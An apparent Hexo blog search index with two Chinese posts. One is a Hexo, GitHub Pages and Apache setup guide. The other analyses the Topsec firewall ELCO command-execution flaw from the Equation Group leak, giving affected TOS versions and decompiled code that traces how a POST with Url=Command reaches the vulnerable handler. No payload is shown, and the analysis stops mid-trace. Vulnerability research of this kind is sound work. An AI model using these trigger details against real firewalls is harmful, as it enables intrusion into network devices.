<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[使用Hexo建立博客]]></title>
      <url>http://yoursite.com/2016/10/09/using_Hexo_buildBlog/</url>
      <content type="html"><![CDATA[<p>如果使用<code>apt-get install</code>的方式来安装nodejs、npm会有一些坑，此处使用官方编译好的压缩包来安装Hexo的前期依赖，并在一台<code>ubuntu 14.x x64</code>的Ali ECS上进行部署，通过其上的Apache/Nginx直接解析public文件夹下生成的静态页面，通过git向Github Page同步<code>静态文件分支</code>，向自己的Github同步<code>代码分支</code>达到版本控制的目的</p>
<a id="more"></a>
<h1 id="0x00-安装nodejs"><a href="#0x00-安装nodejs" class="headerlink" title="0x00 安装nodejs"></a>0x00 安装nodejs</h1><p>从<a href="https://nodejs.org/en/" target="_blank" rel="external">官网</a>下载<code>Download for Linux (x64)</code><br>解压缩后，重命名文件夹，放置在合适位置，比如/root/nodejs<br>通常用<code>tar zvxf ...</code>解压<code>.tar.gz</code>结尾的压缩包，<code>.tar.xz</code>需要两条命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">xz -d node-v4.6.0-linux-x64.tar.xz</div><div class="line">tar xvf node-v4.6.0-linux-x64.tar</div><div class="line">mv node-v4.6.0-linux-x64.tar /root/nodejs</div></pre></td></tr></table></figure></p>
<p>在<code>nodejs/bin</code>文件夹下发现<code>node</code>与<code>npm</code>两个文件  </p>
<p>设置软链接到<code>/usr/local/bin</code>使以上两个命令可以全局使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo ln -s /home/DshtAnger/nodejs/bin/node /usr/local/bin/node</div><div class="line">sudo ln -s /home/DshtAnger/nodejs/bin/npm /usr/local/bin/npm</div></pre></td></tr></table></figure></p>
<h1 id="0x01-安装配置Git"><a href="#0x01-安装配置Git" class="headerlink" title="0x01 安装配置Git"></a>0x01 安装配置Git</h1><p>此过程非常easy，主要查看参考文章中的如下两篇<br><a href="http://www.jianshu.com/p/99665608d295" target="_blank" rel="external">Hexo搭建个人博客2</a>  或 <a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/001374385852170d9c7adf13c30429b9660d0eb689dd43a000" target="_blank" rel="external">生成Github的SSH Key</a>  </p>
<h2 id="安装git："><a href="#安装git：" class="headerlink" title="安装git："></a>安装git：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install git-core</div></pre></td></tr></table></figure>
<h2 id="生成SSH-Key"><a href="#生成SSH-Key" class="headerlink" title="生成SSH Key"></a>生成SSH Key</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</div></pre></td></tr></table></figure>
<p>把邮件地址换成自己的，然后一路回车，使用默认值即可，由于这个Key也不是用于军事目的，所以也无需设置密码  </p>
<p>如果一切顺利的话，可以在用户主目录里找到<code>.ssh</code>目录，里面有<code>id_rsa</code>和<code>id_rsa.pub</code>两个文件，这两个就是SSH Key的秘钥对  </p>
<p><code>id_rsa</code>是私钥，不能泄露出去。<code>id_rsa.pub</code>是公钥，是要往<code>Github Settings SSH Keys</code>页面填写的  </p>
<p>这样做的好处在于，有了SSH Key以后通过git push的时候无需像使用https时每次都要输入用户名和密码  </p>
<h2 id="配置Github-Page"><a href="#配置Github-Page" class="headerlink" title="配置Github Page"></a>配置Github Page</h2><p>在不购买服务器的情况下，可以直接将网站挂在GitHub Pages，这里仅作为一个ECS的备份使用：</p>
<ol>
<li>你需要拥有一个<a href="https://github.com/" target="_blank" rel="external">GitHub账号</a></li>
<li>进入<a href="https://pages.github.com/" target="_blank" rel="external">GitHub Pages</a>，跟着一步步做，完成后就能在浏览器打开<a href="http://DshtAnger.github.io" target="_blank" rel="external">http://DshtAnger.github.io</a>  </li>
</ol>
<h1 id="0x02-安装Hexo"><a href="#0x02-安装Hexo" class="headerlink" title="0x02 安装Hexo"></a>0x02 安装Hexo</h1><h2 id="npm换源："><a href="#npm换源：" class="headerlink" title="npm换源："></a>npm换源：</h2><p>使用<code>npm</code>进行安装，此后一些插件也需要该工具，所以先将它配置好  </p>
<p><code>npm</code> 全称 <code>Node Package Manager</code>，是node.js的模块依赖管理工具  </p>
<p>首先，将<code>npm</code>的更新源换为淘宝的更新源，否则无法安装成功，你懂的   </p>
<ul>
<li>临时使用(增加参数)：<code>npm install -g hexo-cli --registry https://registry.npm.taobao.org</code></li>
<li>持久使用(推荐)：<code>npm config set registry https://registry.npm.taobao.org</code><br>配置后可通过下面方式来验证是否成功<br><code>npm config get registry</code> 或 <code>npm info express</code></li>
</ul>
<h2 id="开始安装："><a href="#开始安装：" class="headerlink" title="开始安装："></a>开始安装：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install -g hexo-cli [--registry https://registry.npm.taobao.org]</div></pre></td></tr></table></figure>
<p>安装完成后会在nodejs文件夹下出现hexo的链接，再次将该文件链接到/usr/local/bin：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ln -s /home/NAME/nodejs/bin/hexo /usr/local/bin/hexo</div></pre></td></tr></table></figure></p>
<h1 id="0x03-Hexo配置"><a href="#0x03-Hexo配置" class="headerlink" title="0x03 Hexo配置"></a>0x03 Hexo配置</h1><p>克隆下来Github Page对应的仓库，放在/var/www/：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /var/www</div><div class="line">git clone git@github.com:DshtAnger/DshtAnger.github.io.git</div></pre></td></tr></table></figure></p>
<p>很多基本用法可以参考：<a href="https://hexo.io/zh-cn/docs/index.html" target="_blank" rel="external">Hexo官方文档</a>   </p>
<h2 id="初始化："><a href="#初始化：" class="headerlink" title="初始化："></a>初始化：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd DshtAnger.github.io</div><div class="line">hexo init</div></pre></td></tr></table></figure>
<p>接下来不能直接<code>hexo generate</code>，否则报一个<code>ERROR Try running: &#39;npm install hexo --save&#39;</code>的错误  </p>
<h2 id="安装依赖："><a href="#安装依赖：" class="headerlink" title="安装依赖："></a>安装依赖：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install</div></pre></td></tr></table></figure>
<h2 id="生成静态文件："><a href="#生成静态文件：" class="headerlink" title="生成静态文件："></a>生成静态文件：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo generate</div></pre></td></tr></table></figure>
<h2 id="本地启动："><a href="#本地启动：" class="headerlink" title="本地启动："></a>本地启动：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo server</div></pre></td></tr></table></figure>
<p>浏览器输入<code>http://IP:4000</code>就能看到页面了  </p>
<h1 id="0x04-deploy到Github"><a href="#0x04-deploy到Github" class="headerlink" title="0x04 deploy到Github"></a>0x04 deploy到Github</h1><p><a href="https://hexo.io/zh-cn/docs/deployment.html" target="_blank" rel="external">参考官网描述</a></p>
<h2 id="安装git插件："><a href="#安装git插件：" class="headerlink" title="安装git插件："></a>安装git插件：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>
<h2 id="修改-config-yml中参数："><a href="#修改-config-yml中参数：" class="headerlink" title="修改_config.yml中参数："></a>修改<code>_config.yml</code>中参数：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># Deployment</div><div class="line">## Docs: https://hexo.io/docs/deployment.html</div><div class="line">deploy:</div><div class="line">  type: git</div><div class="line">  repo: git@github.com:DshtAnger/DshtAnger.github.io.git</div><div class="line">  branch: master</div></pre></td></tr></table></figure>
<h2 id="一键部署："><a href="#一键部署：" class="headerlink" title="一键部署："></a>一键部署：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>这样就将整个public文件夹下生成的静态文件push到<code>DshtAnger.github.io.git</code>仓库中.访问<code>https://dshtanger.github.io/</code>就能看到网站内容了  </p>
<p>但是代码部分没有能够同步进去，即无法完成版本控制  </p>
<p>解决办法：可以另建一个分支，将所有非pubic文件夹的文件，git push到github</p>
<h1 id="0x05-使用Apache解析静态文件"><a href="#0x05-使用Apache解析静态文件" class="headerlink" title="0x05 使用Apache解析静态文件"></a>0x05 使用Apache解析静态文件</h1><p><code>hexo generate</code>后<code>public</code>文件夹下生成了网站的完整静态文件，只要让Apache或者Nginx以public文件夹作文根目录进行解析，就能直接通过ECS的公网ip访问到我们的网站，内容和同步到Github Page的一致，但访问速度和承载力自然胜过前者不少  </p>
<p>根据前面，在<code>/var/www</code>下有一个<code>DshtAnger.github.io</code>文件夹，放置了所有的Hexo代码文件和生成的静态文件夹<code>public</code>，现在修改Apache的默认根目录到public即可  </p>
<h2 id="修改默认根目录"><a href="#修改默认根目录" class="headerlink" title="修改默认根目录"></a>修改默认根目录</h2><p>参考：<a href="http://www.linuxdiyf.com/linux/13068.html" target="_blank" rel="external">Ubuntu 14.04下Apache修改网站根目录及默认网页</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">在 /etc/apache2/sites-available 中修改 000-default.conf</div><div class="line">中的DocumentRoot /var/www/ 修改为想要的目录</div><div class="line">比如：DocumentRoot /var/www/html/DshtAnger.github.io/public</div></pre></td></tr></table></figure></p>
<p>重启Apache服务后，接下来就能直接通过ECS的IP或者域名进行访问了，在未修改其他配置时默认挂载在80端口  </p>
<h2 id="禁止显示目录结构"><a href="#禁止显示目录结构" class="headerlink" title="禁止显示目录结构"></a>禁止显示目录结构</h2><p>参考：<a href="http://www.jb51.net/article/46767.htm" target="_blank" rel="external">禁止apache显示目录索引的常见方法</a>  </p>
<p><code>vim /etc/apache2/apache2.conf</code>，找到下面部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;Directory /var/www/&gt;</div><div class="line">        Options Indexes FollowSymLinks</div><div class="line">        AllowOverride None</div><div class="line">        Require all granted</div><div class="line">&lt;/Directory&gt;</div></pre></td></tr></table></figure></p>
<p>删除<code>Indexes</code>，然后重启服务</p>
<h2 id="启用多端口"><a href="#启用多端口" class="headerlink" title="启用多端口"></a>启用多端口</h2><p>比如默认的80端口被其他的应用使用，可以将网站挂到其他端口如8080<br>参考：<a href="http://www.mengxinjie.cn/node/65" target="_blank" rel="external">多个端口配置虚拟主机</a></p>
<h3 id="修改ports-conf"><a href="#修改ports-conf" class="headerlink" title="修改ports.conf"></a>修改ports.conf</h3><p><code>vim /etc/apache2/ports.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">NameVirtualHost *:80</div><div class="line">Listen 80</div><div class="line"></div><div class="line">NameVirtualHost *:8080</div><div class="line">Listen 8080</div></pre></td></tr></table></figure></p>
<h3 id="修改网站启动配置文件"><a href="#修改网站启动配置文件" class="headerlink" title="修改网站启动配置文件"></a>修改网站启动配置文件</h3><p><code>/etc/apache2/sites-available</code><br><code>cp 000-default.conf blog.conf</code><br><code>vim blog.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;VirtualHost *:8080&gt;</div><div class="line">        ServerAdmin webmaster@localhost</div><div class="line">        DocumentRoot /var/www/DshtAnger.github.io/public/</div><div class="line"></div><div class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</div><div class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</div><div class="line">&lt;/VirtualHost&gt;</div></pre></td></tr></table></figure></p>
<h3 id="启动配置"><a href="#启动配置" class="headerlink" title="启动配置"></a>启动配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a2ensite blog.conf</div><div class="line">service apache2 reload</div></pre></td></tr></table></figure>
<p>然后就能在<a href="http://IP:8080访问到以public文件夹作为根目录的网站，和80端口互不干扰" target="_blank" rel="external">http://IP:8080访问到以public文件夹作为根目录的网站，和80端口互不干扰</a></p>
<h1 id="0x06-更换主题"><a href="#0x06-更换主题" class="headerlink" title="0x06 更换主题"></a>0x06 更换主题</h1><p>知乎上有个帖子推荐了很多不错的主题与链接，<a href="https://www.zhihu.com/question/24422335" target="_blank" rel="external">有哪些好看的 Hexo 主题？</a>  </p>
<ol>
<li>通过<code>git clone</code>对应的项目到<code>DshtAnger.github.io/themes</code></li>
<li><p>修改网站配置文件<code>_config.yml</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Extensions</div><div class="line">## Plugins: https://hexo.io/plugins/</div><div class="line">## Themes: https://hexo.io/themes/</div><div class="line">theme: THEMES_NAME</div></pre></td></tr></table></figure>
</li>
<li><p>修改主题配置文件<code>THEMES_NAME/_config.yml</code></p>
</li>
</ol>
<h2 id="本博客主题yelee"><a href="#本博客主题yelee" class="headerlink" title="本博客主题yelee"></a>本博客主题<code>yelee</code></h2><p><a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" rel="external">Yelee</a>基于主题<a href="https://github.com/litten/hexo-theme-yilia" target="_blank" rel="external">Hexo-Theme-Yilia</a>修改而来，在此感谢作者MOxFIVE的出色工作，该主题的完整<a href="http://moxfive.coding.me/yelee/" target="_blank" rel="external">设置文档</a>在此</p>
<h3 id="滚动条问题"><a href="#滚动条问题" class="headerlink" title="滚动条问题"></a>滚动条问题</h3><p>基本设置好后会发现代码区域会有很难看的边框滚动条显示出来，解决办法：<br><code>vim yelee/source/css/_partial/highlight.styl</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">......</div><div class="line">(24行处插入注释那句)</div><div class="line">.article-entry</div><div class="line">  pre, code</div><div class="line">    font-family: font-mono, monospace, font-chs</div><div class="line">    font-size: 1em</div><div class="line">  pre</div><div class="line">    @extend $code-block</div><div class="line">    overflow: hidden //去除滑动条</div><div class="line">    code</div><div class="line">   </div><div class="line">......</div></pre></td></tr></table></figure></p>
<p>此外修改34行<code>max-height</code>参数可以改变代码区域的可显示高度  </p>
<h3 id="404页面问题"><a href="#404页面问题" class="headerlink" title="404页面问题"></a>404页面问题</h3><p><code>hexo new page 404</code><br><code>source/404/index.md</code>中添加页面内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: 404 Not Found</div><div class="line">toc: false</div><div class="line">comments: false</div><div class="line">permalink: /404</div><div class="line">---</div><div class="line">页面正文</div></pre></td></tr></table></figure></p>
<p>完成后<code>hexo generate</code>后就会有<code>public/404.html</code></p>
<p>为了使服务器解析到不存在页面，或者禁止访问的页面时，都跳到404页面，进行如下设置：<br><code>vim /etc/apache2/apache2.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">//加入如下两行</div><div class="line">ErrorDocument 404 /404.html</div><div class="line">ErrorDocument 403 /404.html</div></pre></td></tr></table></figure></p>
<h3 id="修改-archives页面样式"><a href="#修改-archives页面样式" class="headerlink" title="修改/archives页面样式"></a>修改/archives页面样式</h3><p><code>vim yelee/source/css/_partial/archive.styl</code><br>我是直接替换了原版主题的这个文件，因为个人更喜欢原版的间距风格</p>
<h3 id="修改边栏顶部随机颜色"><a href="#修改边栏顶部随机颜色" class="headerlink" title="修改边栏顶部随机颜色"></a>修改边栏顶部随机颜色</h3><p><code>vim yelee/source/js/main.js</code><br>144行处找到如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var colorList = [&quot;#6da336&quot;, &quot;#ff945c&quot;, &quot;#66CC66&quot;, &quot;#99CC99&quot;, &quot;#CC6666&quot;, &quot;#76becc&quot;, &quot;#c99979&quot;, &quot;#918597&quot;, &quot;#4d4d4d&quot;]</div></pre></td></tr></table></figure></p>
<p>删除其中的几个粉嫩颜色,<code>#CC6666</code>、<code>#ff945c</code>、<code>#c99979</code>等  </p>
<h1 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h1><ul>
<li><a href="https://my.oschina.net/blogshi/blog/260953" target="_blank" rel="external">多种方式安装nodejs</a></li>
<li><a href="http://www.jianshu.com/p/0deb70e6f395" target="_blank" rel="external">npm换源</a>  </li>
<li><a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/001374385852170d9c7adf13c30429b9660d0eb689dd43a000" target="_blank" rel="external">生成Github的SSH Key</a>  </li>
<li><a href="https://hexo.io/zh-cn/docs/index.html" target="_blank" rel="external">Hexo官方文档</a>  </li>
<li><a href="http://www.jianshu.com/collection/7fafdc0abb5b" target="_blank" rel="external">简书-Hexo专题</a></li>
<li><a href="http://baixin.io/2015/08/HEXO%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" target="_blank" rel="external">Hexo搭建个人博客1</a>  </li>
<li><a href="http://www.jianshu.com/p/99665608d295" target="_blank" rel="external">Hexo搭建个人博客2</a>  </li>
<li><a href="http://www.jianshu.com/p/a2023a601ceb" target="_blank" rel="external">Hexo搭建个人博客3</a>  </li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Topsec ECLO 漏洞利用分析]]></title>
      <url>http://yoursite.com/2016/08/17/Topsec_ELCO_Analy/</url>
      <content type="html"><![CDATA[<p>近期NSA方程式组织被泄漏出的针对天融信防火墙的漏洞利用中，有一处名为<code>ELCO-Eligible Contestant</code>的漏洞  </p>
<p>该漏洞是TOS系统中入口文件<code>maincgi.cgi</code>文件里处理post请求产生的一个<code>命令执行漏洞</code></p>
<a id="more"></a>
<h1 id="天融信ELCO-Eligible-Contestant漏洞利用分析"><a href="#天融信ELCO-Eligible-Contestant漏洞利用分析" class="headerlink" title="天融信ELCO-Eligible Contestant漏洞利用分析"></a>天融信ELCO-Eligible Contestant漏洞利用分析</h1><h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h3><p>天融信是中国领先的信息安全产品与服务解决方案提供商。基于创新的 “可信网络架构”以及业界领先的信息安全产品与服务，天融信致力于改善用户网络与应用的可视性、可用性、可控性和安全性，降低安全风险，创造业务价值   </p>
<p>近期NSA方程式组织被泄漏出的针对天融信防火墙的漏洞利用中，有一处名为<code>ELCO-Eligible Contestant</code>的漏洞  </p>
<p>该漏洞是TOS系统中入口文件<code>maincgi.cgi</code>文件里处理post请求产生的一个<code>命令执行漏洞</code></p>
<h3 id="2-漏洞影响"><a href="#2-漏洞影响" class="headerlink" title="2. 漏洞影响"></a>2. 漏洞影响</h3><p>攻击者可以在通过构造特定post请求，在防火墙设备上执行任意命</p>
<h3 id="3-漏洞触发条件"><a href="#3-漏洞触发条件" class="headerlink" title="3. 漏洞触发条件"></a>3. 漏洞触发条件</h3><p>版本：TOS <code>3.3.005.057.1</code> to <code>3.3.010.024.1</code><br>端口：port <code>443</code> open<br>硬件：not <code>ARM</code> based firewalls  </p>
<h2 id="二、漏洞原理分析"><a href="#二、漏洞原理分析" class="headerlink" title="二、漏洞原理分析"></a>二、漏洞原理分析</h2><p>该漏洞是<code>maincgi.cgi</code>文件处理post请求存在缺陷导致漏洞的产生，主函数调用逻辑大致如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">int __cdecl main()</div><div class="line">&#123;</div><div class="line">	......</div><div class="line">	printf(&quot;Cache-Control: no-cache\r\n&quot;);</div><div class="line">	printf(&quot;Pragma: no-cache\r\n&quot;);</div><div class="line">	v17 = (int)getenv(&quot;HTTP_COOKIE&quot;);</div><div class="line">	//接下来几个调用为关键点</div><div class="line">	//关键点1</div><div class="line">	sub_815AD34();</div><div class="line">	//关键点2</div><div class="line">	cgiFormStringNoNewlines((int)&quot;Url&quot;, &amp;s1, 32);</div><div class="line">	if ( !strcmp(&amp;s1, &quot;Command&quot;) )</div><div class="line">	&#123;</div><div class="line">	  cgi_init_headers();</div><div class="line">	  //关键点3</div><div class="line">	  sub_8105F42();</div><div class="line">	  return 0;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>关键点1，跟进到<code>sub_815AD34()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">signed int sub_815AD34()</div><div class="line">&#123;</div><div class="line">  _BYTE *k; // [sp+18h] [bp-10h]@13</div><div class="line">  char *i; // [sp+1Ch] [bp-Ch]@7</div><div class="line">  </div><div class="line">  ......</div><div class="line">  </div><div class="line">  //关键点1.1</div><div class="line">  sub_815B140((int)&amp;dword_823A974, &quot;REQUEST_METHOD&quot;);</div><div class="line">  ......</div><div class="line">  </div><div class="line">  //关键点1.2</div><div class="line">  if ( !sub_815E67F(dword_823A974, &quot;post&quot;) )</div><div class="line">  &#123;</div><div class="line">    if ( sub_815E67F(dword_823A974, &quot;get&quot;) )</div><div class="line">    &#123;</div><div class="line">      n = strlen(dword_823ADC0);</div><div class="line">      if ( sub_815C398() )</div><div class="line">      &#123;</div><div class="line">        cgiFreeResources();</div><div class="line">        return -1;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    goto LABEL_29;</div><div class="line">	</div><div class="line">	......</div><div class="line"></div><div class="line">LABEL_29:</div><div class="line">    dword_822F1B4 = 1;</div><div class="line">    return 0;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>关键点1.1，和请求方式有关，跟进到函数<code>sub_815B140()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">调用：sub_815B140((int)&amp;dword_823A974, &quot;REQUEST_METHOD&quot;);</div><div class="line"></div><div class="line">int __cdecl sub_815B140(int a1, char *name)</div><div class="line">&#123;</div><div class="line">  int result; // eax@1</div><div class="line"></div><div class="line">  *(_DWORD *)a1 = getenv(name);</div><div class="line">  result = a1;</div><div class="line">  </div><div class="line">  if ( !*(_DWORD *)a1 )</div><div class="line">  &#123;</div><div class="line">    result = a1;</div><div class="line">    *(_DWORD *)a1 = &amp;byte_81F9374;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>形参<code>a1</code>即<code>dword_823A974</code>的地址，name指针为”REQUEST_METHOD”的首地址，系统函数<code>getenv()</code>返回name指向的环境变量的具体值，并赋值给a1即dword_823A974。当请求为post时，变量<code>dword_823A974</code>将获得字符串<code>&quot;post&quot;</code>的首地址。   </p>
<p>回到关键点1.2，此时dword_823A974指向了”post”，跟进到<code>sub_815E67F()</code>中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">调用：sub_815E67F(dword_823A974, &quot;post&quot;);</div><div class="line"></div><div class="line">int __cdecl sub_815E67F(_BYTE *a1, _BYTE *a2)</div><div class="line">&#123;</div><div class="line">  int v2; // ebx@6</div><div class="line"></div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    if ( !*a1 )</div><div class="line">      return *a2 == 0;</div><div class="line">    if ( !*a2 )</div><div class="line">      return 0;</div><div class="line">    if ( !(*(_WORD *)(_ctype_b + 2 * *a1) &amp; 0x400) )</div><div class="line">      break;</div><div class="line">    v2 = tolower(*a1);</div><div class="line">    if ( v2 != tolower(*a2) )</div><div class="line">      return 0;</div><div class="line">LABEL_10:</div><div class="line">    ++a1;</div><div class="line">    ++a2;</div><div class="line">  &#125;</div><div class="line">  if ( *a1 == *a2 )</div><div class="line">    goto LABEL_10;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>该函数用移动字符指针的方式，依次比较两个参数所指向字符串的每一个字符，并且只进行小写比较，最终返回0  </p>
<p>这样就进入关键点1.2的if语句块，经过goto到LABEL_29，再返回0  </p>
<p>回到main()中，关键点2，跟进<code>cgiFormStringNoNewlines()</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">调用：cgiFormStringNoNewlines((int)&quot;Url&quot;, &amp;s1, 32);</div><div class="line"></div><div class="line">int __cdecl cgiFormStringNoNewlines(int a1, char *dest, int a3)</div><div class="line">&#123;</div><div class="line">  signed int v4; // [sp+10h] [bp-8h]@2</div><div class="line">  const char **v5; // [sp+14h] [bp-4h]@1</div><div class="line">  //关键点2.1</div><div class="line">  v5 = sub_815E7CD((char *)a1);</div><div class="line">  if ( v5 )</div><div class="line">  &#123;</div><div class="line">	//关键点2.2</div><div class="line">    v4 = sub_815D063((int)v5, dest, a3, 0);</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    strcpy(dest, &amp;byte_81F9374);</div><div class="line">    v4 = 4;</div><div class="line">  &#125;</div><div class="line">  return v4;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>形参a1指向<code>&quot;Url&quot;</code>，跟进关键点2.1处，<code>sub_815E7CD()</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">调用：v5 = sub_815E7CD((char *)a1);</div><div class="line"></div><div class="line">const char **__cdecl sub_815E7CD(char *a1)</div><div class="line">&#123;</div><div class="line">  dword_822F1B8 = a1;</div><div class="line">  dword_822F1BC = dword_8238840;</div><div class="line">  return sub_815E7EC();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
